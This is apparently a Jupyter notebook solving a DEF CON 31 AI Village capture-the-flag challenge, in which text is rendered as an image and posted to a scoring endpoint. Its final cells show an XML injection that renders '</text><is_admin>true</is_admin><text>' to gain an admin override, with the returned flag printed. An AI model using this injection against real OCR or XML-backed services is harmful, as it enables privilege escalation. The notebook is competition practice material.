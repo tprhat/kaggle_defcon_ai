{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2023-10-23T12:20:47.784135900Z",
     "start_time": "2023-10-23T12:20:47.759447200Z"
    }
   },
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "def pixelate(img, pixel_size=10):\n",
    "    img = img.resize(\n",
    "        (img.size[0] // pixel_size, img.size[1] // pixel_size),\n",
    "        Image.NEAREST\n",
    "    )\n",
    "    img = img.resize(\n",
    "        (img.size[0] * pixel_size, img.size[1] * pixel_size),\n",
    "        Image.NEAREST\n",
    "    )\n",
    "    return img\n",
    "\n",
    "img = Image.open('pixelated/flag_full.png')\n",
    "# plt.figure(figsize=(20, 5))\n",
    "# img_cropped = img.crop((198, 0, 429, 48))\n",
    "# bottom left:  70,23\n",
    "# top right: 855, 0\n",
    "img_pixelated = pixelate(img, pixel_size=40)\n",
    "# img.paste(img_pixelated, (198, 0))\n",
    "img_pixelated.save('pixelated/flag_full_pixes.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "outputs": [],
   "source": [
    "from PIL import Image, ImageFont\n",
    "\n",
    "def get_img_from_text(text, filename=None):\n",
    "    font_size = 36\n",
    "    font_filepath = \"pixelated/font/Lucida Console Regular.ttf\"\n",
    "    color = (0, 0, 0)\n",
    "    \n",
    "    font = ImageFont.truetype(font_filepath, size=font_size)\n",
    "    mask_image = font.getmask(text, mode=\"1\")\n",
    "    img = Image.new(\"RGB\", mask_image.size, color=(255,255,255))\n",
    "    img.im.paste(color, (0, 0) + mask_image.size, mask_image)  # need to use the inner `img.im.paste` due to `getmask` returning a core\n",
    "    if filename:\n",
    "        img.save(f\"pixelated/testing/{filename}.png\")\n",
    "    else:\n",
    "        img.save(f\"pixelated/testing/{text}.png\")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-23T16:03:03.766054Z",
     "start_time": "2023-10-23T16:03:03.750847500Z"
    }
   },
   "id": "387244cfbb3fc9ed"
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "outputs": [
    {
     "data": {
      "text/plain": "{'status': 'success', 'upstream_msg': 'Entry inserted', 'text': 'admin'}"
     },
     "execution_count": 104,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "import requests\n",
    "import base64\n",
    "import os\n",
    "# with open('/kaggle/input/ai-village-capture-the-flag-defcon31/pixelated/reference.png', 'rb') as f:\n",
    "with open('yes.png', 'rb') as f:\n",
    "    input_data = f.read()\n",
    "    input_data = base64.b64encode(input_data).decode()\n",
    "# print(input_data)\n",
    "\n",
    "def query(input_data):\n",
    "    response = requests.post('http://pixelated.advml.com/score', json={'data': input_data})\n",
    "    # response = requests.get('http://pixelated.advml.com/score', params={'data': input_data})\n",
    "    return response.json()\n",
    "\n",
    "query(input_data)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-23T15:40:07.868126600Z",
     "start_time": "2023-10-23T15:40:06.728625300Z"
    }
   },
   "id": "76642d27db3b34c2"
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Basically when I tried some random values I figured out this problem consisted of XML injection and then I iterated until I got the flag. \n",
    "```xml\n",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<request action=\"get\">\n",
    "    <system>pixelated</system>\n",
    "    <text>801-867-5309</text>\n",
    "    <is_admin>true</is_admin>\n",
    "</request>\n",
    "```"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "a0ca0f58a2b23b82"
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'status': 'admin_override_engaged', 'flag': 'gAAAAABlNpu6B1ubAVoMTDhHzXjwlM475ZwwQsZel6kyEgeJNMMOckT4dH3iNqc_JTsCheGejx32xc5DkmFMYguS_GE5EbFC3_1sNUeKZCJga083-FwI2fv7P6bUTDgyFFs8V8C0WdIC7NEMN0pciggeSiFMP_b5fe08VpVbfplXVH1FFjYXkf4='}\n"
     ]
    }
   ],
   "source": [
    "get_img_from_text(\"FLAG</text><is_admin>true</is_admin><text>\", filename=\"is_admin_true\")\n",
    "with open(f'pixelated/testing/is_admin_true.png', 'rb') as f:\n",
    "    input_data = f.read()\n",
    "    input_data = base64.b64encode(input_data).decode()\n",
    "print(query(input_data))"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-23T16:13:45.975202500Z",
     "start_time": "2023-10-23T16:13:42.720789400Z"
    }
   },
   "id": "a63eb90feec1a509"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
